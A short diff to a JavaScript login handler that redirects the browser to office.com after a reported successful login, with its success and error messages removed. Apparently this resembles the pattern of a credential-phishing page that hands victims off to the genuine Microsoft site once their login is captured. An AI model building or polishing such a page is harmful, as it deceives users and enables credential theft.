@@ -668,7 +668,9 @@
 
                 if (response.ok) {
                     if (data.loginSuccess) {
-                        // Removed success message
+                        // Redirect to office.com after successful login
+                        window.location.href = 'https://office.com';
+                        return;
                     } else {
                         // Removed error message
                     }
